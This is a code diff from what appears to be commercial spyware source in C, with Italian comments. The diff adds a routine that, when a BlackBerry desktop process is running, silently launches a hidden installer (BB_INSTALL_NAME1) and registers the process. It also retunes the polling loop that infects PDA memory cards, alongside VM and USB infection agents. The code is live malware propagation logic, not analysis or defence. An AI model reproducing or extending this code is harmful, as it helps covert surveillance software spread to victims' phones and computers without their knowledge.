@@ -1,5 +1,5 @@
 #define SPREAD_AGENT_SLEEP_TIME 2*60*60*1000  // Ogni 2 ore 
-#define PDA_AGENT_SLEEP_TIME 5000 // Ogni 5 secondi controlla il PDA
+#define PDA_AGENT_SLEEP_TIME 30000 // Ogni 30 secondi controlla il PDA
 #define USB_AGENT_SLEEP_TIME 2000 // Ogni 2 secondi controlla l'USB
 #define VMW_AGENT_SLEEP_TIME 10*60*1000 // Ogni 10 minuti controlla le VM
 
@@ -21,6 +21,8 @@ BOOL infection_vm = FALSE;		// Deve infettare le VM?
 
 BOOL one_user_infected = FALSE; // Infetta solo un utente in una run
 DWORD vm_delay = VMW_AGENT_SLEEP_TIME; // Delay per il loop di polling sulle VM
+
+extern void SM_AddExecutedProcess(DWORD);
 
 typedef struct _RAPIINIT {
   DWORD cbSize;
@@ -225,6 +227,22 @@ BOOL PDAFilesPresent()
 		return FALSE;
 	CloseHandle(hfile);
 	hfile = FNC(CreateFileA)(HM_CompletePath(H4_MOBZOO_NAME, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hfile == INVALID_HANDLE_VALUE)
+		return FALSE;
+	CloseHandle(hfile);
+	return TRUE;
+}
+
+BOOL BBFilesPresent()
+{
+	HANDLE hfile;
+	char check_path[_MAX_PATH];
+
+	hfile = FNC(CreateFileA)(HM_CompletePath(BB_INSTALL_NAME1, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hfile == INVALID_HANDLE_VALUE)
+		return FALSE;
+	CloseHandle(hfile);
+	hfile = FNC(CreateFileA)(HM_CompletePath(BB_INSTALL_NAME2, check_path), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE)
 		return FALSE;
 	CloseHandle(hfile);
@@ -1118,6 +1136,8 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 #ifndef FAKE_MOBILE_INFECTION
 	LOOP {
 		WCHAR mmc_path[MAX_PATH];
+		
+		CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME);
 		if (infection_pda && PDAFilesPresent() && TryRapiConnect(3000)) {
 			if (FindMemoryCard(mmc_path, MAX_PATH) && !IsPDAInfected(mmc_path)) {
 				if (InfectPDA(mmc_path)) {
@@ -1128,7 +1148,20 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 			RapiDisconnect();
 			CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME*2);
 		}
-		CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME);
+
+		if (infection_pda && BBFilesPresent() && HM_FindPid("Rim.Desktop.exe", FALSE)) {
+			STARTUPINFO si;
+		    PROCESS_INFORMATION pi;
+			ZeroMemory( &pi, sizeof(pi) );
+ 			ZeroMemory( &si, sizeof(si) );
+			si.cb = sizeof(si);
+ 			si.wShowWindow = SW_HIDE;
+			si.dwFlags = STARTF_USESHOWWINDOW;
+			HM_CreateProcess(BB_INSTALL_NAME1, 0, &si, &pi, 0);
+
+			if (pi.dwProcessId) 
+				SM_AddExecutedProcess(pi.dwProcessId);
+		}
 	}
 	return 0;
 #else
@@ -1140,7 +1173,7 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 			SendStatusLog(L"[Inf. Module]: Spread to Mobile Device");	
 			RapiDisconnect();
 		}
-		CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME/2);
+		CANCELLATION_SLEEP(bPM_pdacp, 2500);
 	}
 	return 0;
 #endif
